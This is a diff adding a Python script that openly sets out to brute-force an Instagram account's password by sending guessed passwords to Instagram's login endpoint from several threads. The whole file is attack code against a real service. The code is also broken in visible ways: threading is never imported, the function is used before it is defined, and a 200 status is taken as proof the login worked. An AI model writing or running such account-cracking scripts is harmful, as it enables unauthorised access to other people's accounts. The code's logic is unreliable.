@@ -1,0 +1,40 @@
+import requests
+import hashlib
+import time
+
+# Set the target Instagram account credentials
+username = "target_username"
+password = "target_password"
+
+# Set the number of threads to use for the brute-force attack
+threads = 10
+
+# Set the character set to use for the password
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}:<>?[]{}|;:',.<>/?"
+
+# Create a list to store the threads
+threads_list = []
+
+# Create the threads
+for i in range(threads):
+    t = threading.Thread(target=brute_force, args=(username, password, chars))
+    threads_list.append(t)
+    t.start()
+
+# Wait for all threads to finish
+for t in threads_list:
+    t.join()
+
+def brute_force(username, password, chars):
+    for i in range(len(chars)):
+        for j in range(len(chars)):
+            for k in range(len(chars)):
+                password_guess = password + chars[i] + chars[j] + chars[k]
+                response = requests.post("https://www.instagram.com/accounts/login/", data={"username": username, "password": password_guess})
+                if response.status_code == 200:
+                    print(f"Found password: {password_guess}")
+                    exit()
+                time.sleep(0.1)
+
+# Run the brute-force attack
+brute_force(username, password, chars)
